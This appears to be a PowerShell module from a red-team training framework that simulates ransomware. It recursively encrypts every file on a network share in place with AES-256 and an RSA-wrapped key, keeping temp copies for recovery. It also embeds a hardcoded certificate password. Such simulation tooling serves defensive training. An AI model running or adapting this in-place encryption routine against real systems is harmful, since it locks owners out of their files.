<#
.Synopsis
    AS2Go – File Encryption Simulation (Security Awareness Demo)

.Description
    This script is part of the AS2Go (Attack Simulation 2 Go) framework and is
    intended exclusively for authorized security-awareness training and red-team
    demonstrations in isolated lab environments.

    It simulates a ransomware-style file-encryption scenario by encrypting files
    on a designated network share using an X.509 RSA public-key certificate and
    AES-256-CBC symmetric encryption.  The purpose is to demonstrate the impact
    of ransomware attacks so that defenders can observe, detect, and respond to
    the behaviour in a controlled, reversible manner.

    All encrypted files are first copied to $env:TEMP as a built-in safety net.
    The companion decryption script can restore all files using the private key
    of the same certificate.

.Requirements
    A valid certificate must exist (or will be created automatically) in
    Cert:\LocalMachine\My with Subject "CN={AS2Go}".
    Run the following to inspect available certificates:
        Get-ChildItem Cert:\LocalMachine\My | Format-Table Thumbprint, Subject

    To create a suitable self-signed certificate manually:
        New-SelfSignedCertificate -Subject "CN={AS2Go}" `
            -CertStoreLocation "Cert:\LocalMachine\My" `
            -KeyExportPolicy Exportable -KeySpec Signature `
            -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256

    On Windows Server 2012 – import an exported PFX instead:
        $SecurePass = ConvertTo-SecureString -String '1q' -AsPlainText -Force
        Import-PfxCertificate -FilePath C:\Users\adsa\OneDrive - mrhozi\PowerShell Module\AS2Go\2026.04.30.1114\LabSetup\Encryption `
            -CertStoreLocation Cert:\LocalMachine\My -Password $SecurePass
        Get-ChildItem Cert:\LocalMachine\My | Format-Table Thumbprint, Subject


        $PfxPath    = 'C:\Users\adsa\OneDrive - mrhozi\PowerShell Module\AS2Go\2026.04.30.1114\LabSetup\Encryption\as2go.pfx'
$SecurePass = ConvertTo-SecureString -String '1q' -AsPlainText -Force

Import-PfxCertificate -FilePath $PfxPath `
    -CertStoreLocation 'Cert:\LocalMachine\My' `
    -Password $SecurePass `
    -Exportable

Get-ChildItem 'Cert:\LocalMachine\My' |
    Format-Table Thumbprint, Subject, HasPrivateKey

.Notes
    Author  : AS2Go / me@mrhozi.com
    License : MIT
    Credit  : Encryption/FileStream pattern based on work by Ryan Ries.
              https://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certificates.x509certificate2.aspx

    WARNING : Use only in authorized lab environments. Unauthorized use is
              illegal and unethical.


#>

# Part of the AS2Go Security Awareness Demo Framework
# Simulates certificate-based file encryption on a designated lab share.

Function Invoke-FileEncryption {
    param(
        [string] $share
    )

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    If ((Test-Path -Path $share -PathType Any) -eq $false) {
        Invoke-OutPut -Type Warning -Message "Target path not found - aborting simulation: '$share'"
        return
    }

    #$encoderName = "AS2Go"

    #Get-ChildItem 'Cert:\LocalMachine\my' -Recurse | Where-Object { $_.HasPrivateKey -eq $true -and $_.Subject -match $env:ComPUTERNAME } | Format-Table Thumbprint, Subject, HasPrivateKey, PsPath

    #Get-ChildItem Cert:\LocalMachine\My | Format-Table Thumbprint, Subject | Out-Host
    Write-Host "`n"

    $cert = Get-ChildItem 'Cert:\LocalMachine' -Recurse |
    Where-Object {
        $_.HasPrivateKey -and
        $_.Subject -match "^CN=$([regex]::Escape($env:COMPUTERNAME))\."
    } |
    Select-Object -First 1

    $encoder = Get-ChildItem 'Cert:\LocalMachine' -Recurse | Where-Object { $_.HasPrivateKey -eq $true -and $_.Subject -match "CN=$env:ComPUTERNAME." } | Select-Object -First 1
    $AS2GoCert = $cert.Thumbprint

    if ($AS2GoCert) {
        Write-log -message "Simulation certificate found: $($encoder.Subject ) | $($encoder.Thumbprint)"
    }
    else {
        Write-Host "No simulation certificate found – creating self-signed certificate '$encoderName'..." | Out-Host
        New-SelfSignedCertificate -Subject "CN={$encoderName}" `
            -CertStoreLocation 'Cert:\LocalMachine\My' `
            -KeyExportPolicy Exportable -KeySpec Signature `
            -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256 | Out-Null
        $encoder = Get-ChildItem Cert:\LocalMachine\My | Where-Object Subject -eq "CN={$encoderName}" | Select-Object -First 1
        $AS2GoCert = $encoder.Thumbprint
    }

    #Write-Host "`nSimulation certificate thumbprint: $AS2GoCert`n" | Out-Host

    # Load the certificate object used for key exchange
    #$Cert = Get-ChildItem "Cert:\LocalMachine\My\$AS2GoCert" | Select-Object -First 1
    #pause

    # Collect all files on the target share (simulation scope)
    $FilesToProcess = Get-ChildItem -Path $share -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { -not $_.PSIsContainer } |
    Select-Object -ExpandProperty FullName

    # Simulate encryption for each discovered file
    foreach ($file in $FilesToProcess) {
        Start-FileEncryption -FileToEncrypt $file -Cert $Cert -ErrorAction SilentlyContinue
    }

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}

Function Start-FileEncryption {
    <#
    .Synopsis
        Encrypts a single file using AES-256-CBC with an RSA-encrypted session key.
        The file content is read into memory first, then the original is overwritten directly.
        A plain-text safety copy is saved to $Script:AS2GOTempDir before overwriting.
        The original can be restored using the private key of the provided certificate.
    #>
    Param(
        [Parameter(Mandatory)][System.IO.FileInfo]$FileToEncrypt,
        [Parameter(Mandatory)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert
    )

    # Read entire file into memory so we can safely overwrite it in-place
    $plainBytes = [System.IO.File]::ReadAllBytes($FileToEncrypt.FullName)

    # Safety copy of the original to temp before overwriting
    $tempPath = [System.IO.Path]::Combine($Script:AS2GOTempDir, $FileToEncrypt.Name)
    [System.IO.File]::WriteAllBytes($tempPath, $plainBytes)

    # Set up AES-256-CBC and wrap the session key with the certificate's public RSA key
    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $keyFormatter = [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]::new($Cert.PublicKey.Key)
    $encryptedKey = $keyFormatter.CreateKeyExchange($aes.Key, $aes.GetType())

    # File layout: [4 bytes keyLen][4 bytes ivLen][encryptedKey][iv][ciphertext]
    try {
        $writer = [System.IO.FileStream]::new($FileToEncrypt.FullName, [System.IO.FileMode]::Create)

        $writer.Write([System.BitConverter]::GetBytes($encryptedKey.Length), 0, 4)
        $writer.Write([System.BitConverter]::GetBytes($aes.IV.Length), 0, 4)
        $writer.Write($encryptedKey, 0, $encryptedKey.Length)
        $writer.Write($aes.IV, 0, $aes.IV.Length)

        $cryptoStream = [System.Security.Cryptography.CryptoStream]::new(
            $writer,
            $aes.CreateEncryptor(),
            [System.Security.Cryptography.CryptoStreamMode]::Write
        )

        $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
        $cryptoStream.FlushFinalBlock()
    }
    catch {
        Invoke-OutPut -Type Error "Encryption failed for '$($FileToEncrypt.FullName)': $_"
        return
    }
    finally {
        $cryptoStream?.Close()
        $writer?.Close()
        $aes.Dispose()
    }
    Invoke-Output -Type Bullet -Message "Encoded file" -TM $FileToEncrypt.FullName
}

Function Start-FileEncryption_Old {
    <#
    .Synopsis
        Encrypts a single file using AES-256-CBC with an RSA-encrypted session key.
        The encrypted output is written to $env:TEMP and then replaces the original.
        The original can be restored using the private key of the provided certificate.
    #>
    Param(
        [Parameter(Mandatory)][System.IO.FileInfo]$FileToEncrypt,
        [Parameter(Mandatory)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert
    )

    # Build temp output path safely
    $tempPath = [System.IO.Path]::Combine($Script:AS2GOTempDir, $FileToEncrypt.Name)

    # Set up AES-256-CBC and wrap the session key with the certificate's public RSA key
    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $keyFormatter = [System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter]::new($Cert.PublicKey.Key)
    $encryptedKey = $keyFormatter.CreateKeyExchange($aes.Key, $aes.GetType())

    # File layout: [4 bytes keyLen][4 bytes ivLen][encryptedKey][iv][ciphertext]
    try {
        $writer = [System.IO.FileStream]::new($tempPath, [System.IO.FileMode]::Create)

        $writer.Write([System.BitConverter]::GetBytes($encryptedKey.Length), 0, 4)
        $writer.Write([System.BitConverter]::GetBytes($aes.IV.Length), 0, 4)
        $writer.Write($encryptedKey, 0, $encryptedKey.Length)
        $writer.Write($aes.IV, 0, $aes.IV.Length)

        $cryptoStream = [System.Security.Cryptography.CryptoStream]::new(
            $writer,
            $aes.CreateEncryptor(),
            [System.Security.Cryptography.CryptoStreamMode]::Write
        )

        $reader = [System.IO.FileStream]::new($FileToEncrypt.FullName, [System.IO.FileMode]::Open)
        $reader.CopyTo($cryptoStream)   # replaces the manual block-read loop

        $cryptoStream.FlushFinalBlock()
    }
    catch {
        Write-Error "Encryption failed for '$($FileToEncrypt.FullName)': $_"
        return
    }
    finally {
        $reader?.Close()
        $cryptoStream?.Close()
        $writer?.Close()
        $aes.Dispose()
    }

    # Overwrite the original with the encrypted copy
    Copy-Item -Path $tempPath -Destination $FileToEncrypt.FullName -Force
}

